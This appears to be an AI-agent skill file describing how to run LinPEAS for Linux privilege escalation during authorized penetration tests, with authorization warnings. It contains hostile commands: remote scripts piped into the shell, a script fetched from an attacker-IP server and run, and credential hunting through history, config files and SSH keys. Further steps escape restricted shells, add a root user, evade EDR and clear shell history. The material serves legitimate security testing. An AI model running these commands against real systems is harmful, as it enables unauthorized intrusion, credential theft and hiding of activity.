---
name: privesc-linpeas
description: >
  Linux privilege escalation enumeration and attack surface analysis using LinPEAS
  (Linux Privilege Escalation Awesome Script). Automates post-exploitation discovery
  of escalation vectors, misconfigurations, and credential exposure on Linux targets.
  Use when: (1) Enumerating privilege escalation vectors after initial access on a
  Linux system, (2) Identifying SUID/SGID binaries, sudo misconfigurations, and
  capability abuses, (3) Hunting for credentials in config files, history, and logs,
  (4) Detecting container breakout opportunities and writable service files, (5)
  Mapping kernel exploits and CVE exposure for a target system, (6) Conducting
  authorized CTF, red team, or penetration test post-exploitation phases.
version: 0.1.0
maintainer: SirAppSec
category: offsec
tags: [privesc, linpeas, post-exploitation, linux, enumeration, red-team, privilege-escalation]
frameworks: [MITRE-ATT&CK, PTES]
dependencies:
  tools: [curl, bash, python3]
  optional: [wget]
references:
  - https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS
  - https://book.hacktricks.xyz/linux-hardening/privilege-escalation
  - https://attack.mitre.org/tactics/TA0004/
  - https://attack.mitre.org/tactics/TA0007/
---

# LinPEAS Linux Privilege Escalation

## Overview

LinPEAS (Linux Privilege Escalation Awesome Script) is the most comprehensive automated enumeration tool for identifying privilege escalation vectors on Linux systems. It checks 200+ attack vectors, color-codes findings by severity, and maps results to GTFOBins and MITRE ATT&CK.

**IMPORTANT**: Use only on systems where you have explicit written authorization. Unauthorized use constitutes computer fraud. All actions should be conducted within defined engagement scope.

## Quick Start

```bash
# Download and run LinPEAS directly (no-install, in-memory)
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Save output for analysis
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh -a 2>&1 | tee /tmp/linpeas_output.txt

# Stealth / faster scan (skips time-consuming checks)
/tmp/linpeas.sh -s 2>&1 | tee /tmp/linpeas_fast.txt
```

**Script variants** (choose based on environment):
- `linpeas.sh` — default, includes linux exploit suggester
- `linpeas_fat.sh` — embeds third-party tools (no internet needed on target)
- `linpeas_small.sh` — essential checks only, smallest footprint

Use `scripts/linpeas_runner.py` for structured JSON output and automated triage.

## Core Workflow

### Post-Exploitation Enumeration Workflow

Progress:
[ ] 1. Verify authorization and document scope
[ ] 2. Transfer or fetch LinPEAS to target (curl, wget, or scp)
[ ] 3. Execute scan: `./linpeas.sh -a 2>&1 | tee linpeas_output.txt`
[ ] 4. Triage findings by severity (RED = critical, YELLOW = medium)
[ ] 5. Validate top vectors manually before exploitation
[ ] 6. Attempt privilege escalation using highest-confidence vector
[ ] 7. Verify privilege level: `id && whoami`
[ ] 8. Document exploitation path and clean up artifacts

### Severity Color Guide

| Color   | Meaning                                              |
|---------|------------------------------------------------------|
| RED+    | 95% escalation probability (exploit immediately)     |
| RED     | High confidence vector (validate then exploit)       |
| YELLOW  | Interesting finding (requires manual review)         |
| GREEN   | Low-risk information                                 |

### Targeted Scans (Faster Execution)

```bash
# SUID/SGID binaries only
find / -perm -4000 -o -perm -2000 2>/dev/null | xargs ls -la

# Sudo permissions
sudo -l

# Running processes and services
ps aux && systemctl list-units --type=service --state=running

# Capabilities
/usr/sbin/getcap -r / 2>/dev/null

# Writable paths in PATH
echo $PATH | tr ':' '\n' | xargs -I{} find {} -writable -type f 2>/dev/null

# Cron jobs
cat /etc/crontab; ls -la /etc/cron.*; crontab -l 2>/dev/null

# Network connections and open ports
ss -tulpn; netstat -tulpn 2>/dev/null
```

## Key Attack Vectors

See [references/privesc_vectors.md](references/privesc_vectors.md) for detailed exploitation steps per vector.

### Tier 1: High-Confidence Escalation Paths

**Sudo Misconfigurations**
```bash
sudo -l
# Look for: NOPASSWD entries, unrestricted shells, wildcard abuse
# GTFOBins: https://gtfobins.github.io/
```

**SUID Binaries**
```bash
find / -perm -u=s -type f 2>/dev/null
# Cross-reference with GTFOBins for exploitation techniques
```

**Writable /etc/passwd or /etc/shadow**
```bash
ls -la /etc/passwd /etc/shadow
# If writable: add root user with known hash
```

**Kernel Exploits**
```bash
uname -r && cat /etc/os-release
# Use linpeas output: check CVE suggestions for kernel version
```

### Tier 2: Credential Hunting

```bash
# Bash history
cat ~/.bash_history; find / -name ".bash_history" 2>/dev/null | xargs cat

# Config files with passwords
grep -r "password\|passwd\|secret\|token" /etc /opt /var/www 2>/dev/null --include="*.conf" --include="*.cfg" --include="*.ini"

# SSH keys
find / -name "id_rsa" -o -name "id_ecdsa" 2>/dev/null
```

### Tier 3: Container / Environment Breakout

```bash
# Detect container environment
cat /proc/1/cgroup | grep -i docker
ls /.dockerenv 2>/dev/null
env | grep -i kube

# Check for privileged container
cat /proc/self/status | grep CapEff
# Full capabilities (0000003fffffffff) = privileged container
```

See [references/mitre_mapping.md](references/mitre_mapping.md) for MITRE ATT&CK technique mappings.

## Security Considerations

- **Authorization**: Obtain explicit written authorization before running. Document engagement scope.
- **Sensitive Data**: LinPEAS output contains credentials, hashes, and keys — treat as highly sensitive. Encrypt at rest, delete after engagement.
- **Audit Logging**: Log all commands executed with timestamps in engagement notes. Some blue teams monitor for LinPEAS signatures.
- **OPSEC**: In red team engagements, consider evasion — see references for obfuscation techniques. Run from tmpfs (`/dev/shm`) to avoid disk artifacts.
- **Cleanup**: Remove LinPEAS binary and output files after the engagement. Clear relevant shell history entries.
- **Compliance**: Activities must comply with engagement rules of engagement, SOW, and applicable laws (CFAA, Computer Misuse Act, etc.).

## Bundled Resources

### Scripts (`scripts/`)

- `linpeas_runner.py` — Automates LinPEAS fetch, execution, output parsing, and JSON report generation with severity triage

### References (`references/`)

- `privesc_vectors.md` — Detailed exploitation steps for common Linux privesc vectors (SUID, sudo, crons, capabilities, NFS, LD_PRELOAD, PATH hijacking)
- `mitre_mapping.md` — MITRE ATT&CK technique mappings for each enumerated vector

### Assets (`assets/`)

- `linpeas_report_template.md` — Engagement report template for documenting privilege escalation findings

## Integration Points

- **Post-Metasploit**: Run after initial Meterpreter shell via `shell` command or `post/multi/manage/shell_to_meterpreter`
- **Post-Nmap**: Use after `recon-nmap` identifies live Linux targets
- **CI/CD Security Testing**: Integrate into automated purple team pipelines to validate privilege escalation mitigations
- **Reporting**: Feed `linpeas_runner.py` JSON output into CVSS scoring and risk documentation

## Troubleshooting

### Issue: AV or EDR blocks LinPEAS execution

**Solution**: Use the Python/PSPY alternative or compile a custom version.
```bash
# Run from memory (no disk write)
curl -sL <url> | bash

# Or use pspy for process monitoring only
./pspy64
```

### Issue: Restricted shell (rbash, no /bin/bash)

**Solution**: Escape restricted shell before running enumeration.
```bash
# Try common bypasses
python3 -c 'import pty; pty.spawn("/bin/bash")'
vi -c ':!/bin/bash'
awk 'BEGIN {system("/bin/bash")}'
```

### Issue: No internet access on target

**Solution**: Transfer LinPEAS via the attacker machine.
```bash
# On attacker (Python HTTP server)
python3 -m http.server 8080

# On target
wget http://<attacker-ip>:8080/linpeas.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh && /tmp/lp.sh
```

## References

- [LinPEAS GitHub](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)
- [HackTricks Linux Privesc](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
- [GTFOBins](https://gtfobins.github.io/)
- [MITRE ATT&CK TA0004 Privilege Escalation](https://attack.mitre.org/tactics/TA0004/)
- [MITRE ATT&CK TA0007 Discovery](https://attack.mitre.org/tactics/TA0007/)
- [PayloadsAllTheThings Linux Privesc](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
